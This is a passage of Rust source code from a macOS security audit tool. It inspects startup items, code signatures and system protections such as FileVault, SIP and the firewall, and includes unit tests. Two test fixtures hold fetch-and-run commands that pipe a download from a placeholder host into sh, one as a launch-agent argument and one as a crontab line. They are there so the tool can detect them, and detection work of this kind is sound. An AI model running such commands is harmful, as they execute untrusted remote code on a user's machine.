    match text.rsplit_once(" (") {
        Some((name, team)) => (
            name.trim().to_string(),
            team.trim_end_matches(')').to_string(),
        ),
        None => (text.trim().to_string(), String::new()),
    }
}

/// Reads `codesign -dv --verbose=2`, which prints to stderr.
fn parse_codesign(succeeded: bool, output: &str) -> Signer {
    if !succeeded {
        if output.contains("not signed at all") {
            return Signer::Unsigned;
        }
        if output.contains("Permission denied") || output.contains("Operation not permitted") {
            return Signer::Unreadable;
        }
        return Signer::NotChecked;
    }
    let field = |key: &str| {
        output
            .lines()
            .find_map(|line| line.strip_prefix(key))
            .map(str::trim)
    };
    if field("Signature=") == Some("adhoc") {
        return Signer::AdHoc;
    }
    let authority = field("Authority=").unwrap_or_default();
    match authority {
        // Older systems say "Software Signing"; macOS 27 says "macOS Software Signing".
        "Software Signing" | "macOS Software Signing" => Signer::Apple,
        "Apple Mac OS Application Signing" => Signer::AppStore,
        "" => Signer::AdHoc,
        _ => match authority.strip_prefix("Developer ID Application: ") {
            Some(rest) => {
                let (name, team) = split_team(rest);
                let team = field("TeamIdentifier=").map_or(team, str::to_string);
                Signer::DeveloperId { name, team }
            }
            None => {
                let name = authority
                    .split_once(": ")
                    .map_or(authority, |(_, name)| name);
                Signer::Development {
                    name: split_team(name).0,
                }
            }
        },
    }
}

fn signature(path: &Path) -> Signer {
    let path = path.to_string_lossy();
    match command("/usr/bin/codesign", &["-dv", "--verbose=2", &path]) {
        Some((succeeded, output)) => parse_codesign(succeeded, &output),
        None => Signer::NotChecked,
    }
}

/// Who made what this item runs. Never opens anything in a folder macOS protects, which would ask
/// the user for permission in the middle of a check.
fn signer_of(ctx: &ScanContext, item: &StartupItem, access: bool) -> Signer {
    let Some(program) = item.program.as_deref().map(Path::new) else {
        return Signer::NotChecked;
    };
    let checkable = |path: &Path| {
        path.is_absolute()
            && !path.starts_with("/Volumes")
            && (access || !gate::is_inside_guarded(&ctx.home, path))
            && path.exists()
    };
    if !checkable(program) {
        return Signer::NotChecked;
    }
    let name = program.file_name().map(|name| name.to_string_lossy());
    let interpreter = name
        .as_deref()
        .is_some_and(|name| startup::INTERPRETERS.contains(&name));
    if interpreter {
        // `open /Applications/X.app` runs an app, and the app's signature is what matters.
        let target = startup::interpreted_target(&item.arguments).map(Path::new);
        return match (name.as_deref(), target) {
            (Some("open"), Some(target)) if checkable(target) => signature(target),
            _ => Signer::Script,
        };
    }
    if program.is_dir() {
        return signature(program);
    }
    match is_mach_o(program) {
        Some(false) => Signer::Script,
        // Mach-O, or unreadable: codesign tells which.
        _ => signature(program),
    }
}

fn review_item(ctx: &ScanContext, item: StartupItem, access: bool) -> StartupReview {
    let signer = signer_of(ctx, &item, access);
    let changed = std::fs::metadata(&item.plist_path)
        .and_then(|meta| meta.modified())
        .ok();
    let (level, reasons) = assess(&item, &signer, &ctx.home, changed, ctx.now);
    StartupReview {
        item,
        signer,
        level,
        reasons,
    }
}

/// How much a startup item deserves a look, and why. Pure, so the rules can be tested.
fn assess(
    item: &StartupItem,
    signer: &Signer,
    home: &Path,
    changed: Option<SystemTime>,
    now: SystemTime,
) -> (Level, Vec<String>) {
    let mut level = Level::Ok;
    let mut reasons = Vec::new();
    let mut raise = |to: Level, reason: String| {
        level = level.max(to);
        reasons.push(reason);
    };

    match signer {
        Signer::Unsigned => raise(Level::Review, t!(
            "No tiene firma, así que no se sabe quién lo hizo.",
            "It has no signature, so there's no telling who made it."
        ).to_string()),
        Signer::AdHoc => raise(Level::Info, t!(
            "Su firma no identifica a nadie. Es normal en Homebrew y en lo que compilas tú.",
            "Its signature identifies no one. That's normal for Homebrew and for what you build yourself."
        ).to_string()),
        Signer::Development { .. } => raise(Level::Info, t!(
            "Lleva una firma de desarrollo, no de distribución.",
            "It carries a development signature, not a distribution one."
        ).to_string()),
        _ => {}
    }

    let command_line = item.arguments.join(" ");
    if *signer == Signer::Script {
        if downloads_something(&command_line) {
            raise(
                Level::Review,
                t!(
                    "Al arrancar descarga o decodifica algo para ejecutarlo.",
                    "At startup it downloads or decodes something to run it."
                )
                .to_string(),
            );
        } else {
            raise(
                Level::Info,
                t!(
                    "Ejecuta un script, que no lleva firma.",
                    "It runs a script, which carries no signature."
                )
                .to_string(),
            );
        }
    }

    if !signer.is_identified() {
        if let Some(program) = item.program.as_deref() {
            if let Some(reason) = odd_location(home, Path::new(program)) {
                raise(Level::Review, reason.to_string());
            }
        }
    }

    let known = !matches!(signer, Signer::Unreadable | Signer::NotChecked);
    if item.label.starts_with("com.apple.") && known && !matches!(signer, Signer::Apple) {
        raise(
            Level::Review,
            t!(
                "Lleva un nombre de Apple, pero no lo firmó Apple.",
                "It carries an Apple name, but Apple didn't sign it."
            )
            .to_string(),
        );
    }

    // Updaters from known developers rewrite their own plists all the time; that says nothing.
    if let (Some(changed), false) = (changed, signer.is_identified()) {
        let recent = now
            .duration_since(changed)
            .is_ok_and(|age| age.as_secs() <= RECENT_DAYS * 86_400);
        if recent {
            raise(
                Level::Info,
                tf!(
                    "Se añadió o cambió {}.",
                    "It was added or changed {}.",
                    human_age(changed, now)
                ),
            );
        }
    }

    // What doesn't run can't do anything, however odd it looks.
    if item.disabled {
        level = level.min(Level::Info);
    }
    (level, reasons)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::StartupKind;
    use std::path::PathBuf;

    fn item(label: &str, program: &str, arguments: &[&str]) -> StartupItem {
        StartupItem {
            label: label.to_string(),
            kind: StartupKind::UserAgent,
            plist_path: PathBuf::from(format!("/Users/ana/Library/LaunchAgents/{label}.plist")),
            program: Some(program.to_string()),
            arguments: arguments.iter().map(|arg| arg.to_string()).collect(),
            run_at_load: true,
            keep_alive: false,
            disabled: false,
            orphaned: false,
            malformed: false,
        }
    }

    fn developer(name: &str) -> Signer {
        Signer::DeveloperId {
            name: name.to_string(),
            team: "ABCDE12345".to_string(),
        }
    }

    const HOME: &str = "/Users/ana";
    fn now() -> SystemTime {
        UNIX_EPOCH + Duration::from_secs(1_800_000_000)
    }

    fn level_of(item: &StartupItem, signer: &Signer) -> Level {
        assess(item, signer, Path::new(HOME), None, now()).0
    }

    #[test]
    fn reads_codesign_output() {
        let developer_id = "Executable=/x\nAuthority=Developer ID Application: Docker Inc (9BNSXJN65R)\nAuthority=Developer ID Certification Authority\nTeamIdentifier=9BNSXJN65R\n";
        assert_eq!(
            parse_codesign(true, developer_id),
            Signer::DeveloperId {
                name: "Docker Inc".into(),
                team: "9BNSXJN65R".into()
            }
        );
        assert_eq!(
            parse_codesign(true, "Authority=Software Signing\n"),
            Signer::Apple
        );
        assert_eq!(
            parse_codesign(true, "Authority=macOS Software Signing\n"),
            Signer::Apple
        );
        assert_eq!(
            parse_codesign(true, "Authority=Apple Mac OS Application Signing\n"),
            Signer::AppStore
        );
        assert_eq!(
            parse_codesign(true, "Signature=adhoc\nTeamIdentifier=not set\n"),
            Signer::AdHoc
        );
        assert_eq!(
            parse_codesign(
                true,
                "Authority=Apple Development: Ana Pérez (Q1W2E3R4T5)\n"
            ),
            Signer::Development {
                name: "Ana Pérez".into()
            }
        );
        assert_eq!(
            parse_codesign(false, "/tmp/x: code object is not signed at all\n"),
            Signer::Unsigned
        );
        assert_eq!(
            parse_codesign(
                false,
                "/Library/PrivilegedHelperTools/x: Permission denied\n"
            ),
            Signer::Unreadable
        );
    }

    #[test]
    fn reads_the_signature_of_real_programs() {
        let dir = tempfile::tempdir().unwrap();
        let script = dir.path().join("run.sh");
        std::fs::write(&script, "#!/bin/sh\necho hola\n").unwrap();
        let ctx = ScanContext::with_home(dir.path(), hm_core::Config::default());
        let signer_for =
            |program: &Path| signer_of(&ctx, &item("x", &program.to_string_lossy(), &[]), true);
        assert_eq!(signer_for(Path::new("/bin/ls")), Signer::Apple);
        // Test binaries are signed ad hoc by the linker on Apple Silicon.
        if cfg!(target_arch = "aarch64") {
            let exe = std::env::current_exe().unwrap();
            assert_eq!(signer_for(&exe), Signer::AdHoc);
        }
        assert_eq!(signer_for(&script), Signer::Script);
        assert_eq!(signer_for(&dir.path().join("gone")), Signer::NotChecked);
        let via_shell = item("x", "/bin/sh", &["/bin/sh", "-c", "echo hola"]);
        assert_eq!(signer_of(&ctx, &via_shell, true), Signer::Script);
    }

    #[test]
    fn known_signers_pass_wherever_they_live() {
        let gog = item(
            "com.gog.galaxy.commservice",
            "/Users/Shared/GOG.com/Galaxy/redists/GalaxyCommunication",
            &[],
        );
        assert_eq!(level_of(&gog, &developer("GOG")), Level::Ok);
        let homebrew = item(
            "homebrew.mxcl.postgresql",
            "/opt/homebrew/opt/postgresql/bin/postgres",
            &[],
        );
        assert_eq!(level_of(&homebrew, &Signer::AdHoc), Level::Info);
    }

    #[test]
    fn unknown_code_in_odd_places_is_worth_a_look() {
        for program in [
            "/tmp/updater",
            "/private/var/folders/xy/T/agent",
            "/Users/Shared/.helper/agent",
            "/Users/ana/.config_sync/agent",
        ] {
            let suspicious = item("com.helper.agent", program, &[]);
            let (level, reasons) =
                assess(&suspicious, &Signer::AdHoc, Path::new(HOME), None, now());
            assert_eq!(level, Level::Review, "{program}");
            assert_eq!(reasons.len(), 2, "{program}: {reasons:?}");
        }
        let tool = item("dev.tool", "/Users/ana/.cargo/bin/tool", &[]);
        assert_eq!(level_of(&tool, &Signer::AdHoc), Level::Info);
        assert_eq!(
            level_of(&item("x", "/usr/local/bin/x", &[]), &Signer::Unsigned),
            Level::Review
        );
    }

    #[test]
    fn scripts_that_fetch_code_and_fake_apple_names_stand_out() {
        let fetch = item(
            "com.updater",
            "/bin/sh",
            &["/bin/sh", "-c", "curl -s https://x.example/p | sh"],
        );
        assert_eq!(level_of(&fetch, &Signer::Script), Level::Review);
        let plain = item(
            "com.backup",
            "/bin/zsh",
            &["/bin/zsh", "/Users/ana/bin/backup.sh"],
        );
        assert_eq!(level_of(&plain, &Signer::Script), Level::Info);

        let fake = item(
            "com.apple.updated",
            "/Library/Application Support/x/updated",
            &[],
        );
        assert_eq!(level_of(&fake, &developer("Someone")), Level::Review);
        assert_eq!(level_of(&fake, &Signer::Apple), Level::Ok);
        assert_eq!(
            level_of(&fake, &Signer::Unreadable),
            Level::Ok,
            "unknown isn't accused"
        );
    }

    #[test]
    fn recent_items_are_pointed_out_and_disabled_ones_calm_down() {
        let yesterday = now() - Duration::from_secs(86_400);
        let fresh = item("dev.new.agent", "/opt/homebrew/bin/new-agent", &[]);
        let (level, reasons) = assess(
            &fresh,
            &Signer::AdHoc,
            Path::new(HOME),
            Some(yesterday),
            now(),
        );
        assert_eq!(level, Level::Info);
        assert_eq!(reasons.len(), 2, "ad hoc, and added yesterday");
        // A known developer's updater rewriting its plist isn't news.
        let updater = item(
            "com.microsoft.update.agent",
            "/Library/Application Support/Microsoft/MAU2.0/agent",
            &[],
        );
        let (level, reasons) = assess(
            &updater,
            &developer("Microsoft"),
            Path::new(HOME),
            Some(yesterday),
            now(),
        );
        assert_eq!((level, reasons.len()), (Level::Ok, 0));

        let mut off = item("com.helper", "/tmp/helper", &[]);
        off.disabled = true;
        assert_eq!(level_of(&off, &Signer::Unsigned), Level::Info);
    }

    #[test]
    fn reads_the_protections() {
        assert_eq!(parse_filevault("FileVault is On.\n"), Some(true));
        assert_eq!(
            parse_filevault("FileVault is On.\nEncryption in progress: Percent completed = 40\n"),
            Some(true)
        );
        assert_eq!(parse_filevault("FileVault is Off.\n"), Some(false));
        assert_eq!(
            parse_sip("System Integrity Protection status: enabled.\n"),
            Some(true)
        );
        assert_eq!(
            parse_sip("System Integrity Protection status: disabled.\n"),
            Some(false)
        );
        assert_eq!(parse_gatekeeper("assessments enabled\n"), Some(true));
        assert_eq!(parse_gatekeeper("assessments disabled\n"), Some(false));
        assert_eq!(
            parse_firewall("Firewall is disabled. (State = 0)\n"),
            Some(false)
        );
        assert_eq!(
            parse_firewall("Firewall is enabled. (State = 1)\n"),
            Some(true)
        );
        assert_eq!(
            parse_firewall(
                "Firewall is blocking all non-essential incoming connections. (State = 2)"
            ),
            Some(true)
        );
        assert_eq!(parse_firewall("oops"), None);
        assert_eq!(
            parse_screen_lock(
                "2026-11-24 20:38:33.479 sysadminctl[1:2] screenLock delay is immediate\n"
            ),
            Some(ScreenLock::Immediate)
        );
        assert_eq!(
            parse_screen_lock("screenLock delay is 300 seconds"),
            Some(ScreenLock::After(300))
        );
        assert_eq!(
            parse_screen_lock("screenLock is off"),
            Some(ScreenLock::Off)
        );
    }

    #[test]
    fn reads_xprotect_and_dates() {
        let (version, installed) =
            parse_xprotect("Version: 5377 Installed: 2026-11-20 19:29:21 +0000\n").unwrap();
        assert_eq!(version, "5377");
        assert_eq!(
            installed.duration_since(UNIX_EPOCH).unwrap().as_secs(),
            1_795_202_961
        );
        assert_eq!(parse_utc("1970-01-01 00:00:00"), Some(UNIX_EPOCH));
        assert_eq!(
            parse_utc("2000-03-01 00:00:00")
                .unwrap()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            951_868_800
        );
        assert_eq!(parse_xprotect("nothing here"), None);
    }

    #[test]
    fn reads_software_update_preferences() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("prefs.plist");
        let mut update = plist::Dictionary::new();
        update.insert("Display Name".into(), "macOS Tahoe 27.1".into());
        update.insert("Display Version".into(), "27.1".into());
        let mut prefs = plist::Dictionary::new();
        prefs.insert("CriticalUpdateInstall".into(), false.into());
        prefs.insert(
            "RecommendedUpdates".into(),
            Value::Array(vec![update.into()]),
        );
        Value::Dictionary(prefs).to_file_xml(&path).unwrap();

        let read = read_update_prefs(&path).unwrap();
        assert_eq!(read.critical, Some(false));
        assert_eq!(read.config_data, None);
        assert_eq!(read.pending, vec!["macOS Tahoe 27.1".to_string()]);
        assert_eq!(security_updates(Some(&read)).level, Level::Review);
        assert_eq!(
            macos_updates(Some(&read), Some("27.0.1"), now()).level,
            Level::Review
        );
        assert_eq!(
            security_updates(Some(&UpdatePrefs::default())).level,
            Level::Ok
        );
    }

    #[test]
    fn auto_login_is_read_from_the_login_window_preferences() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("loginwindow.plist");
        let mut prefs = plist::Dictionary::new();
        prefs.insert("autoLoginUser".into(), "ana".into());
        Value::Dictionary(prefs).to_file_xml(&path).unwrap();
        assert_eq!(auto_login(&path).level, Level::Risk);
        assert_eq!(
            auto_login(&dir.path().join("missing.plist")).level,
            Level::Ok
        );
    }

    #[test]
    fn finds_what_was_added_to_hosts() {
        let stock = "##\n# Host Database\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost\n";
        assert_eq!(parse_hosts(stock), (Vec::new(), false));
        let dev = format!("{stock}127.0.0.1 api.upb.edu.bo www.api.upb.edu.bo # demo\n");
        assert_eq!(
            parse_hosts(&dev),
            (
                vec!["127.0.0.1 → api.upb.edu.bo, www.api.upb.edu.bo".to_string()],
                false
            )
        );
        let blocking = format!("{stock}0.0.0.0 xp.apple.com\n");
        assert!(parse_hosts(&blocking).1);
    }

    #[test]
    fn finds_sharing_services_listening_beyond_this_mac() {
        let netstat = "\
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
tcp4       0      0  *.22                   *.*                    LISTEN
tcp6       0      0  *.22                   *.*                    LISTEN
tcp4       0      0  127.0.0.1.5900         *.*                    LISTEN
tcp4       0      0  *.8080                 *.*                    LISTEN
tcp4       0      0  192.168.1.4.445        *.*                    LISTEN
tcp4       0      0  192.168.1.4.52000      17.1.1.1.443           ESTABLISHED
";
        assert_eq!(
            parse_listening(netstat),
            vec!["Compartir archivos (SMB)", "Inicio de sesión remoto (SSH)"]
        );
    }

    #[test]
    fn reads_cron_profiles_and_extensions() {
        let crontab = "MAILTO=ana\n# nightly\n0 3 * * * /Users/ana/bin/backup.sh\n*/5 * * * * curl -s http://x.example | sh\n";
        let jobs = cron_jobs(crontab);
        assert_eq!(jobs.len(), 2);
        assert!(downloads_something(&jobs[1]) && !downloads_something(&jobs[0]));

        assert_eq!(
            parse_enrollment("Enrolled via DEP: No\nMDM enrollment: No\n"),
            Some(false)
        );
        assert_eq!(
            parse_enrollment("Enrolled via DEP: Yes\nMDM enrollment: Yes (User Approved)\n"),
            Some(true)
        );
        assert!(
            parse_profiles("There are no configuration profiles installed for user 'ana'")
                .is_empty()
        );
        assert_eq!(
            parse_profiles("ana[1] attribute: profileIdentifier: com.proxy.corp\nana[1] attribute: name: Proxy"),
            vec!["com.proxy.corp".to_string()]
        );

        let extensions = "3 extension(s)\n--- com.apple.system_extension.network_extension\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\tW5364U7YZB\tio.tailscale.ipn.macsys.network-extension (1.104.7/101.104.7)\tTailscale Network Extension\t[activated enabled]\n\t\tXYZ\tcom.old.ext (1.0)\tOld Thing\t[terminated waiting to uninstall on reboot]\n";
        assert_eq!(
            parse_system_extensions(extensions),
            vec!["Tailscale Network Extension (W5364U7YZB)".to_string()]
        );
        assert_eq!(
            count_keys("# comment\nssh-ed25519 AAAA ana@mac\n\nssh-rsa BBBB\n"),
            2
        );
    }

    #[test]
    fn a_full_report_runs_on_this_mac_without_failing() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = ScanContext::with_home(dir.path(), hm_core::Config::default());
        let report = report(&ctx).unwrap();
        assert_eq!(report.protections.len(), 9);
        assert_eq!(report.other.len(), 6);
        assert!(report.macos.is_some());
        // Every check says something, even when it couldn't look.
        for check in report.protections.iter().chain(&report.other) {
            assert!(
                !check.title.is_empty() && !check.detail.is_empty(),
                "{}",
                check.id
            );
        }
    }
}
